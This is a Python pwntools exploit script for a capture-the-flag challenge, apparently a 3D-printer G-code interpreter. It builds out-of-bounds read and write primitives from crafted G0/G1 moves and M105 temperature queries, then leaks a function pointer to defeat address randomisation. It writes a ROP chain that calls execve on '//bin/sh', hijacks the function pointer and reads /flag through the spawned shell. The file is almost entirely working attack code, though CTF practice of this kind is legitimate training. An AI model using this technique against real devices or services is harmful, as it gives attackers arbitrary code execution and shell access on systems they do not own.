import os
import socket
import sys
import time
import struct
import socket

from pwn import *

def swap32(i):
    return struct.unpack("<I", struct.pack(">I", i))[0]
def swap64(i):
    return struct.unpack("<Q", struct.pack(">Q", i))[0]

if len(sys.argv) > 1 and sys.argv[1] == "local":
    p = process("./zig-out/bin/youwouldntdownloada3dprinter", shell=False, stdin=PTY)
    for ent in util.proc.memory_maps(p.pid):
        print(ent.addr, ent.perms, ent.path)
else:
    HOST = os.environ["HOST"]
    PORT = int(os.environ["PORT"])
    TICKET = None if "TICKET" not in os.environ else os.environ["TICKET"]

    p = remote(HOST, PORT)

    if TICKET is not None:
        p.recv(len("Ticket please: "))
        p.send((TICKET + "\n").encode("utf-8"))
        time.sleep(1)

p.recvuntil(b"> Enter G-code:\n")
p.send(b'''
M82 ;absolute extrusion mode
G92 E0 ; Reset Extruder
G28 ; Home all axes
''')

def read_byte(offset):
    p.send(b'G0 X249 Y249 Z'+bytes(str(250+offset), 'utf8')+b'\n')
    p.recvuntil(b'\n')
    p.send(b'M105\n')
    p.recvuntil(b'ok ')
    val = p.recvuntil(b'\n').split(b' ')[-1].split(b':')[1]
    return int(val)

def read_qword(offset):
    v = 0
    v = read_byte(0)
    v = (v << 8) + read_byte(1)
    v = (v << 8) + read_byte(2)
    v = (v << 8) + read_byte(3)
    v = (v << 8) + read_byte(4)
    v = (v << 8) + read_byte(5)
    v = (v << 8) + read_byte(6)
    v = (v << 8) + read_byte(7)
    return swap64(v)

def write_byte(offset, value):
    cur = read_byte(offset)
    if cur < value:
        wval = value - cur
    else:
        wval = 256 - cur + value
    cmd = b'X249 Y249 Z'+bytes(str(250+offset), 'utf8')
    p.send(b'G0 ' + cmd + b'\n')
    p.recvuntil(b'\n')
    p.send(b'G1 ' + cmd + b' E' + bytes(str(wval), 'utf8') + b'\n')
    p.recvuntil(b'\n')
    new = read_byte(offset)
    assert new == value, f'{new} != {value}'
    return new

def write_qword(offset, value):
    write_byte(offset+7, (value & 0xff00000000000000) >> 56)
    write_byte(offset+6, (value & 0x00ff000000000000) >> 48)
    write_byte(offset+5, (value & 0x0000ff0000000000) >> 40)
    write_byte(offset+4, (value & 0x000000ff00000000) >> 32)
    write_byte(offset+3, (value & 0x00000000ff000000) >> 24)
    write_byte(offset+2, (value & 0x0000000000ff0000) >> 16)
    write_byte(offset+1, (value & 0x000000000000ff00) >> 8)
    write_byte(offset+0, (value & 0x00000000000000ff) >> 0)

def write_values(stuff: bytes):
    offset = 0
    for b in stuff:
        cmd = b'X0 Y0 Z'+bytes(str(offset), 'utf8')
        p.send(b'G0 ' + cmd + b'\n')
        p.recvuntil(b'\n')
        p.send(b'G1 ' + cmd + b' E' + bytes(str(b), 'utf8') + b'\n')
        p.recvuntil(b'\n')
        offset+=1
    pass

def plzsleep(s):
    p.send(b'M1 S' + bytes(str(s), 'utf8') + b'\n')
    p.send(b'M105\n')
    p.recvuntil(b'ok ')
    p.recvuntil(b'\n')

def done():
    p.send(b'M84\n')
    p.recvuntil(b'\n')


v = read_qword(0)
print('--- func pointer = ')
print(hex(v))
print('---')

base = v - 0x18d60
array = base + 0x50008

print(f'base = 0x{base:x}')

pack = lambda x : struct.pack('<Q', x)

IMAGE_BASE_0 = 0x0000000000000000 # a33df2474a7f74e2179bbf9914c0d6cac26c264a8c31c421ded507cda83bdb51
IMAGE_BASE_0 = base
rebase_0 = lambda x : pack(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000011dd3) # 0x0000000000011dd3: pop rcx; ret;
rop += b'//bin/sh'
rop += rebase_0(0x000000000003de12) # 0x000000000003de12: pop rsi; ret;
rop += rebase_0(0x000000000004fe80)
rop += rebase_0(0x000000000004afa2) # 0x000000000004afa2: mov qword ptr [rsi], rcx; xor eax, eax; ret;
rop += rebase_0(0x0000000000011dd3) # 0x0000000000011dd3: pop rcx; ret;
rop += pack(0x0000000000000000)
rop += rebase_0(0x000000000003de12) # 0x000000000003de12: pop rsi; ret;
rop += rebase_0(0x000000000004fe88)
rop += rebase_0(0x000000000004afa2) # 0x000000000004afa2: mov qword ptr [rsi], rcx; xor eax, eax; ret;
rop += rebase_0(0x000000000003342a) # 0x000000000003342a: pop rdi; ret;
rop += rebase_0(0x000000000004fe80)
rop += rebase_0(0x000000000003de12) # 0x000000000003de12: pop rsi; ret;
rop += rebase_0(0x000000000004fe88)
rop += rebase_0(0x00000000000469ac) # 0x00000000000469ac: pop rdx; ret;
rop += rebase_0(0x000000000004fe88)
rop += rebase_0(0x000000000001884b) # 0x000000000001884b: pop rax; ret;
rop += pack(0x000000000000003b)
rop += rebase_0(0x0000000000011da5) # 0x0000000000011da5: syscall; ret;


write_values(rop)

#write_qword(0, 0x0000434445464748)
write_qword(0, base + 0x0000000000011dd3)

v = read_qword(0)
print('--- new func pointer = ')
print('b* ' + hex(v))
print('---')

#plzsleep(10)
done()

print("="*50)
#p.interactive()

p.send('cat /flag;exit\n')
flag = p.recvall()
flag = flag[flag.find(b'flag'):]
print(str(flag, 'utf8'))
